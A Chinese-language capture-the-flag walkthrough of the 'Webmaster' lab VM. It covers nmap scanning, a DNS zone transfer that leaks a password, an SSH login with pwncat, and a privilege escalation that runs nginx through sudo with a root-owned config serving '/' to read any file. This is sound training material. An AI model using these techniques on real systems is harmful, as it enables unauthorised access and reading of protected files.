# Webmaster

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-12-05

✔️ MD5 // 218365d6a1fab7967e1e43364bb80be3

☠ Root // 166

💀 User // 173

📝Notes //
Hack and Fun. Tested on Virtualbox.

:::

## 靶机启动

![靶机启动](img/image_20231233-163352.png)

靶机 IP：

```plaintext
192.168.56.115
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.115
Host is up (0.00053s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6d7ed2d5d04536d7c9ed3e1d5c86fbe4 (RSA)
|   256 049d9adeaf31331c7c244a973876f5f7 (ECDSA)
|_  256 b08cedea130f032af3608ac3ba684abe (ED25519)
53/tcp open  domain  (unknown banner: not currently available)
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|     bind
|_    currently available
| dns-nsid:
|_  bind.version: not currently available
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:DB:73:D5 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 探测 web 服务

尝试直接访问

![访问 /](img/image_20231210-181025.png)

检查原始返回

```shell
┌─[randark@randark-Parrot]─[~]
└──╼ $http get 192.168.56.115
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html
Date: Fri, 29 Dec 2023 08:38:01 GMT
ETag: W/"5fcb5787-39"
Last-Modified: Sat, 05 Dec 2020 09:48:55 GMT
Server: nginx/1.14.2
Transfer-Encoding: chunked

<img src="comic.png" alt="comic">
<!--webmaster.hmv-->
```

在其中发现一个疑似域名的字符串

```plaintext
webmaster.hmv
```

结合之前端口扫描发现的 DNS 服务，怀疑可能做了域名解析，添加 hosts 解析记录

```plaintext
# Host addresses
127.0.0.1  localhost
127.0.1.1  randark-Parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters

192.168.56.115 webmaster.hmv
```

然后尝试访问 `webmaster.hmv` ，发现域名并非可以解析的域名，怀疑得通过 DNS 服务进行查询

## 探测 DNS 服务

```plaintext title="dig axfr @192.168.56.115 webmaster.hmv"
; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr @192.168.56.115 webmaster.hmv
; (1 server found)
;; global options: +cmd
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.          604800  IN      NS      ns1.webmaster.hmv.
ftp.webmaster.hmv.      604800  IN      CNAME   www.webmaster.hmv.
john.webmaster.hmv.     604800  IN      TXT     "Myhiddenpazzword"
mail.webmaster.hmv.     604800  IN      A       192.168.0.12
ns1.webmaster.hmv.      604800  IN      A       127.0.0.1
www.webmaster.hmv.      604800  IN      A       192.168.0.11
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
;; Query time: 0 msec
;; SERVER: 192.168.56.115#53(192.168.56.115) (TCP)
;; WHEN: Fri Dec 29 18:25:41 CST 2023
;; XFR size: 8 records (messages 1, bytes 274)
```

发现以下记录

```plaintext
john.webmaster.hmv. --- "Myhiddenpazzword"
```

怀疑是一对凭据

## 凭据利用

```shell
┌─[randark@randark-Parrot]─[~]
└──╼ $pwncat-cs john@192.168.56.115
[18:30:07] Welcome to pwncat 🐈!                                                                                                                         __main__.py:164
Password: ****************
[18:30:11] 192.168.56.115:22: normalizing shell path                                                                                                      manager.py:957
[18:30:12] 192.168.56.115:22: registered new host w/ db                                                                                                   manager.py:957
(local) pwncat$ back
(remote) john@webmaster:/home/john$ whoami
john
```

## user pwned

```shell
(remote) john@webmaster:/home/john$ cat user.txt
HMVdnsyo
```

## 提权探测

```plaintext title="sudo -l"
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

```plaintext title="find / -perm -u=s -type f 2>/dev/null"
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

```plaintext title="getcap -r / 2>/dev/null"
/usr/bin/ping = cap_net_raw+ep
```

可以发现 `nginx` 可以借助 `sudo` 以 root 权限执行

## 尝试提权至任意文件读取

结合 `nginx` 的特性，尝试将根目录进行映射

```plaintext
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 8080;
        root /;
        autoindex on;
    }
}
```

然后使用此配置文件启动 nginx

```shell
(remote) john@webmaster:/home/john$ sudo /usr/sbin/nginx -c /home/john/root.conf
```

即可实现任意文件读取

![访问 :8080](img/image_20231244-184446.png)

## root pwned

```plaintext
HMVnginxpwnd
```
